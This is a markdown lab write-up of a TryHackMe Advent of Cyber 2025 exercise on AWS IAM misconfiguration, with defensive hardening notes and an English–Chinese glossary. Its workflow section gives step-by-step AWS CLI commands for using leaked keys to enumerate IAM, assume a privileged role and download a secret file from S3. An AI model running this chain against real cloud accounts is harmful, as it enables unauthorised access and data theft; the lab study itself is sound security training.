---
type: resource-note
status: done
created: 2026-03-11
updated: 2026-03-12
tags: [security-writeup, tryhackme, aoc2025, aws-security]
source: TryHackMe: Advent of Cyber 2025 Day 23
platform: tryhackme
room: Advent of Cyber 2025 Day 23: AWS Security: S3cret Santa
slug: aoc-2025-day-23-aws-security-s3cret-santa
path: TryHackMe/90-events/thm-aoc-2025/Day 23: AWS Security: S3cret Santa.md
topic: 90-events
domain: [cloud]
skills: [iam, sts, s3]
artifacts: [lab-notes]
sanitized: true
---

# Advent of Cyber 2025 Day 23: AWS Security: S3cret Santa

## Summary

A small set of leaked AWS credentials is enough to regain cloud access when **IAM (Identity and Access Management)** is misconfigured. The lab demonstrates an attacker-style workflow:

1. confirm current identity via **STS**
2. enumerate IAM users/policies
3. detect a **sts:AssumeRole** permission
4. assume a higher-privileged role via temporary credentials
5. enumerate **S3** buckets/objects and retrieve a secret file

---

## Key Concepts

### AWS identity primitives

* **IAM User**: long-lived identity (often paired with long-term access keys).
* **IAM Group**: permission management convenience; users inherit group policies.
* **IAM Role**: *temporary* identity assumed by users/services/external accounts.
* **IAM Policy**: JSON permission document: *Action* + *Resource* + *Condition* (+ Principal in trust policies).

### Inline vs Managed policies

* **Inline policy**: embedded into a single identity; deleted with that identity.
* **Managed policy**: reusable; changes propagate to all attachments.

### Why `sts:AssumeRole` is a pivot

Even if an IAM user only has “read-only enumeration” permissions, **`sts:AssumeRole`** can function as a privilege bridge. The real power lives in the **target role’s policy** and **trust policy** (who is allowed to assume it).

---

## Workflow

### 0) Sanity checks

```bash
01  aws --version
```

### 1) Confirm current identity (STS)

```bash
01  aws sts get-caller-identity
```

Expected fields:

* `Account`: AWS account ID
* `Arn`: identity ARN (user/role)
* `UserId`: internal identifier

### 2) Enumerate IAM users

```bash
01  aws iam list-users
```

### 3) Enumerate policies and group membership for a target user

```bash
01  aws iam list-user-policies --user-name sir.carrotbane
02  aws iam list-attached-user-policies --user-name sir.carrotbane
03  aws iam list-groups-for-user --user-name sir.carrotbane
```

If an inline policy exists, inspect it:

```bash
01  aws iam get-user-policy --policy-name <POLICY_NAME> --user-name sir.carrotbane
```

**Goal:** locate interesting permissions, especially `sts:AssumeRole`.

### 4) Enumerate roles and inspect the candidate role

```bash
01  aws iam list-roles
```

Inspect role policies:

```bash
01  aws iam list-role-policies --role-name bucketmaster
02  aws iam list-attached-role-policies --role-name bucketmaster
03  aws iam get-role-policy --role-name bucketmaster --policy-name BucketMasterPolicy
```

Typical S3-related actions seen in the lab:

* `s3:ListAllMyBuckets`
* `s3:ListBucket`
* `s3:GetObject`

### 5) Assume the role (STS) and set temporary credentials

Assume role:

```bash
01  aws sts assume-role --role-arn arn:aws:iam::<ACCOUNT_ID>:role/bucketmaster --role-session-name TBFC
```

Export the returned temporary credentials:

```bash
01  export AWS_ACCESS_KEY_ID="<AccessKeyId>"
02  export AWS_SECRET_ACCESS_KEY="<SecretAccessKey>"
03  export AWS_SESSION_TOKEN="<SessionToken>"
```

Verify the identity switch:

```bash
01  aws sts get-caller-identity
```

### 6) Enumerate S3 buckets and retrieve an object

List buckets:

```bash
01  aws s3api list-buckets
```

List objects inside a bucket:

```bash
01  aws s3api list-objects --bucket easter-secrets-123145
```

Download a suspicious/interesting object:

```bash
01  aws s3api get-object --bucket easter-secrets-123145 --key cloud_password.txt cloud_password.txt
```

Read file content:

```bash
01  ls
02  cat cloud_password.txt
```

---

## Attack Chain Model

ASCII overview:

```
[Leaked access keys]
      |
      v
[aws cli configured]
      |
      v
[sts get-caller-identity] -> confirm account + arn
      |
      v
[iam list-*] -> discover inline policy
      |
      v
[sts:AssumeRole] -> pivot
      |
      v
[sts assume-role] -> temp creds (AccessKeyId/Secret/SessionToken)
      |
      v
[s3api list-buckets/list-objects/get-object] -> data exposure
```

---

## Defensive Notes

### Why this scenario happens in real life

* Long-term credentials stored on endpoints or left in shell history.
* Over-permissive policies that allow broad enumeration.
* Roles with powerful permissions and overly-broad trust relationships.

### Hardening moves

* **Least Privilege** (*principle of least privilege / 最小权限原则*): remove unused `iam:List*` and narrow `Resource` scopes.
* Constrain **AssumeRole** with Conditions (e.g., MFA requirement, source identity constraints, session duration limits).
* Prefer federated auth (SSO / short-lived creds) over IAM users with long-term keys.
* Monitor: **CloudTrail** for `AssumeRole` events; alert on unusual role sessions.
* Protect S3: encrypt sensitive objects, restrict bucket policies, review access logs.

---

## Common Pitfalls

* Forgetting `AWS_SESSION_TOKEN` after `assume-role` (requests start failing).
* Confusing `aws s3` (high-level) vs `aws s3api` (API-shaped output).
* Reading JSON in pagers: `q` exits; consider `--output json` or `--query` filters.

---

## Takeaways

* Enumeration-only permissions are not always “safe” if `sts:AssumeRole` exists.
* The effective privilege set is: **current identity** + **role trust** + **role policy**.
* S3 is a frequent “secret spill” surface; bucket/object permissions should be treated as high-risk.

---

## Glossary (EN → 中文)

* IAM (Identity and Access Management) → 身份与访问管理
* STS (Security Token Service) → 安全令牌服务
* ARN (Amazon Resource Name) → 资源唯一标识
* Access Key / Secret Access Key → 访问密钥 / 私密访问密钥
* Session Token → 会话令牌（临时凭证的一部分）
* AssumeRole → 扮演角色/切换权限
* Policy (JSON) → 策略（JSON 权限文档）
* Inline Policy → 内联策略
* Managed Policy → 托管策略
* S3 (Simple Storage Service) → 简单存储服务
* Bucket / Object → 桶 / 对象

---

## Further Reading

* AWS CLI configuration & credentials files (`~/.aws/config`, `~/.aws/credentials`)
* AWS STS `get-caller-identity` and `assume-role` command references
* IAM policies & best practices
* S3 access control and logging
